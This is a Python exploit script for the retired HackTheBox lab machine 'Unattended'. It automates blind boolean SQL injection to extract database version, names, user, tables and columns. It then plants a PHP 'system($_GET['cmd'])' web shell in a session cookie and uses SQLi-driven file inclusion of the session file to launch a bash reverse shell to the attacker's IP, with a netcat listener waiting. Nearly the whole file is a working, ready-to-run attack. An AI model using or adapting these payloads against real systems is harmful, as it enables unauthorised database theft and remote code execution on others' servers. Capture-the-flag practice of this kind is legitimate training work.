# Unattended SQL Injection & SQLi to LFI to remote code execution (RCE) single click exploit
# Hackthebox - Unattended (retired) - https://app.hackthebox.com/machines/Unattended/information
# Author: d1Zzy666
# Date: 16-07-2024

"""
Execution path:
+ Identify sql injection point (MANUAL)
+ Determine type of sql i i.e. blind based etc. (MANUAL)
+ Determine database type e.g. mysql etc
+ Determine database version
+ Determine total and names of dbs
+ Determine db column names
+ Write results to disk
+ RCE to shell as www-data
"""

# Libraries & imports etc.
import argparse
import base64
from datetime import datetime
from easy_py_server import EasyPyServer, Request, Response, MultipartFile, ResponseFile, ResponseConfig     # 3rd party reference - https://github.com/scientificRat/easy_py_server
from http.server import SimpleHTTPRequestHandler
import json
from multiprocessing import Process                                   
import os, signal, sys
import re
import requests
from socketserver import TCPServer
import time
import urllib3                                  # Used to suppress SSL warnings
from websocket import create_connection

# global variables
ATTACKIP = "10.10.14.45"                        # UPDATE as required
target = "10.10.10.126"                         # UPDATE to hostname if set in local /etc/hosts 
targetport = 443                                # UPDATE to hostname if set in local /etc/hosts
targetdomain = "www.nestedflanders.htb"         # UPDATE as preferred
targetdomainport = "443"                        # UPDATE as preferred
revPort = 443                                   # UPDATE as preferred
simplewwwport = 9000                            # UPDATE as preferred
cookiesess = "6rfc35idjgeq8ucqlvj8dbnal6"

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-"
dbversion = None
dbname = None
dbuser = None
dbcols = None
table_names = []
cleaned_table_names = None


# Proxy via BURP
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Function can be called for printing a line between - aesthetics of output	
def line():
	return "\n--------------------------------------------------------------------------------\n"

##############WEBSERVERS#############
# Webserver deployment - Easy-py-server (8000)
# Accepts GET & POST Requests
def easy_py_webserver():
    # Start web server and reference folder where payload.js is located
    eps = EasyPyServer(listen_address="0.0.0.0", port=8000, static_folder=".")
        
    # method GET
    @eps.get(".")
    def demo(a: int, b: int):
        return dict(success=True, content="%d + %d = %d" % (a, b, a + b))
    
    eps.start_serve(blocking=True)
    print("\n")

# Webserver deployment - Simple HTTP (9000)
# Not required in this script! ENJOY :D
# For simple GET requests
class customHandler(SimpleHTTPRequestHandler):
	def log_message(self, format, *args): 
		pass
		
	def do_GET(self):
		if (self.path).startswith("/"):				# change this to whatever you want to serve
			text = print(line()+"### GET from {} - {} - {} - {}".format(self.client_address[0], currentTime(), self.request_version, self.path) + line() )
		else:
			text = print(line()+"### GET from {} - {} - {} - {}".format(self.client_address[0], currentTime(), self.request_version, self.path) + line() )
		return SimpleHTTPRequestHandler.do_GET(self)

def simple_webserver():
	httpd = TCPServer(("", simplewwwport), customHandler)
	print("[+] WebServer started on port " + str(simplewwwport) + " (http://0.0.0.0:" + str(simplewwwport) + ")\n")
	process1 = Process(target = httpd.serve_forever)
	try:
		process1.start()
	except KeyboardInterrupt:
		httpd.server_close()
		pass   
print(line())
print(line())
####################################

# Check current time
def currentTime():
    return datetime.now().strftime("%d-%m-%Y_%H:%M:%S")

print(datetime.now().strftime("%d-%m-%Y_%H:%M:%S") + " " + " - HTB Unattended - d1Zzy's exploit script...")
print(line())

# RevShell handlers - netcat deployments
def netcat1():
    os.system(f"nc -nvlp {revPort}")

# Get database version
def getdbversion():
    global dbversion
    dbversion = ""
    position = 1
    session = requests.session()
    urllib3.disable_warnings()
    (print("Retrieving database version..."))
    while True:
        found_char = False
        for char in charset:
            url2 = f"https://{targetdomain}:{targetdomainport}/index.php?id=587" + f"%27%20and%20substring(@@version,{position},1)=%27{char}" + "%27--+"
            cookies = {"PHPSESSID": f"{cookiesess}"}
            headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Connection": "keep-alive"}
            x = session.get(url2, headers=headers, cookies=cookies, verify=False, proxies=proxies)
            if "dynamic page." in x.text:
                dbversion += char
                print(f"[+] Identified a character {char} at position {position}.")
                position += 1
                found_char = True
                break

        if not found_char:
            break

    print(f"Database version: {dbversion}")

# Get database name
def getdbnames():
    global dbname
    dbname = ""
    position = 1
    session = requests.session()
    urllib3.disable_warnings()
    (print("Retrieving database names..."))
    while True:
        found_char = False
        for char in charset:
            url2 = f"https://{targetdomain}:{targetdomainport}/index.php?id=587" + f"%27%20and%20substring(database(),{position},1)=%27{char}" + "%27--+"
            cookies = {"PHPSESSID": f"{cookiesess}"}
            headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Connection": "keep-alive"}
            x = session.get(url2, headers=headers, cookies=cookies, verify=False, proxies=proxies)
            if "dynamic page." in x.text:
                dbname += char
                print(f"[+] Identified a character {char} at position {position}.")
                position += 1
                found_char = True
                break

        if not found_char:
            break

    print(f"Database name: {dbname}")

 # Get current user
def getdbuser():
    global dbuser
    dbuser = ""
    position = 1
    session = requests.session()
    urllib3.disable_warnings()
    (print("Retrieving database user..."))
    while True:
        found_char = False
        for char in charset:
            url2 = f"https://{targetdomain}:{targetdomainport}/index.php?id=587" + f"%27%20and%20substring(user(),{position},1)=%27{char}" + "%27--+"
            cookies = {"PHPSESSID": f"{cookiesess}"}
            headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Connection": "keep-alive"}
            x = session.get(url2, headers=headers, cookies=cookies, verify=False, proxies=proxies)
            if "dynamic page." in x.text:
                dbuser += char
                print(f"[+] Identified a character {char} at position {position}.")
                position += 1
                found_char = True
                break

        if not found_char:
            break

    print(f"Database user: {dbuser}")


 # Get table names
def get_table_names():
    global table_names
    global cleaned_table_names
    table_names = []
    position1 = 1
    session = requests.session()
    urllib3.disable_warnings()
    (print("Retrieving table names..."))

    table_index = 0                         # To iterate over tables
    max_table_length = 15                   # Set a reasonable value
    
    while True:
            table_name = ""
            position1 = 1  # Reset position1 for each new table
            previous_char = None  # Variable to store the previous character found
            previous_previous_char = None  # Variable to store the character before the previous one


            while True:
                found_char = False
                for char in charset:
                    # Construct the SQL query to extract the table name
                    sql_query = f"select table_name from information_schema.tables where table_schema=database() limit {table_index},1"
                    # Construct the URL with the SQL injection payload
                    url2 = (
                        f"https://{targetdomain}:{targetdomainport}/index.php?id=587"
                        f"%27%20and%20substring(({sql_query}),{position1},1)=%27{char}%27--+"
                    )
                    cookies = {"PHPSESSID": cookiesess}
                    headers = {
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Connection": "keep-alive"
                    }
                    x = session.get(url2, headers=headers, cookies=cookies, verify=False, proxies=proxies)

                    # Debugging output for the request
                    #print(f"Trying URL: {url2}")
                    #print(f"Response text: {x.text[:100]}...")  # Print first 100 chars of response for debugging

                    if "dynamic page." in x.text:
                        table_name += char
                        print(f"[+] Identified a character '{char}' at position {position1}.")
                        position1 += 1
                        found_char = True

                        if previous_char and previous_previous_char == previous_char == char:
                             found_char = False
                             break

                        # Update previous_previous_char and previous_char
                        previous_previous_char = previous_char
                        previous_char = char
                        break                   

                if not found_char or position1 > max_table_length:
                    break

            if table_name:
                table_names.append(table_name)
                print(f"Table {table_index + 1} name: {table_name}")
                table_index += 1
            else:
                break  # Break outer loop if no table name is found

            # Remove '&' symbols from table names before printing
            cleaned_table_names = [name.replace('&', '') for name in table_names]
            print(f"All table names: {cleaned_table_names}")


 # Get database columns
def getdbcols():
    global dbcols
    dbcols = ""
    position = 1
    session = requests.session()
    urllib3.disable_warnings()
    (print("Retrieving database columns..."))
    while True:
        found_char = False
        for char in charset:
            sqlquery = "select ascii(substring((select column_name from information_schema.columns where table_name='neddy' limit 0,1),1,1))=105"
            url = f"https://{targetdomain}:{targetdomainport}/index.php?id=587" + f"%27%20and%20substring(({sqlquery}),{position},1)=%27{char}" + "%27--+"
            cookies = {"PHPSESSID": f"{cookiesess}"}
            headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Connection": "keep-alive"}
            x = session.get(url, headers=headers, cookies=cookies, verify=False, proxies=proxies)
            if "dynamic page." in x.text:
                dbcols += char
                print(f"[+] Identified a character {char} at position {position}.")
                position += 1
                found_char = True
                break

        if not found_char:
            break

    print(f"Database columns: {dbcols}")

# Write Results to file
def writetofile():
    file = open("unattended-sqli-output.txt", "w")
    file.write(f"Database version: {dbversion}\n")
    file.write(f"Database name: {dbname}\n")
    file.write(f"Database user: {dbuser}\n")
    file.write(f"All table names: {cleaned_table_names}\n")
    file.write(f"Database columns: {dbcols}\n")
    file.close()

# Pop initial shell (443)
def revshell():
    payload = f"cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{ATTACKIP}/{revPort}+0>%261'"
    hackedcookie = "shell%3d<%3fphp+system($_GET['cmd'])%3b+%3f>"
    urllib3.disable_warnings()
    session = requests.session()
    (print("Connecting to revershell..."))
    time.sleep(5)
    url = f"https://{targetdomain}:{targetport}/index.php?{payload}&id=587%27%20and%201=2%20UNION%20select%20%27d1zzy\\%27%20UNION%20select%20\\%27/var/lib/php/sessions/sess_{cookiesess}\%27--%20-%27--%20-"
    cookies = {"PHPSESSID": f"{cookiesess}", "shell": f"{hackedcookie}"}
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Connection": "keep-alive"}
    x = session.get(url, headers=headers, cookies=cookies, verify=False, proxies=proxies)

if __name__ == "__main__":
    p1 = Process(target=easy_py_webserver, args=())
    p2 = Process(target=simple_webserver, args=())
    p3 = Process(target=netcat1, args=())

    p1.start()
    p2.start()
    p3.start()

    currentTime()
    getdbversion()
    getdbnames()
    getdbuser()
    get_table_names()
    getdbcols()
    writetofile()
    revshell()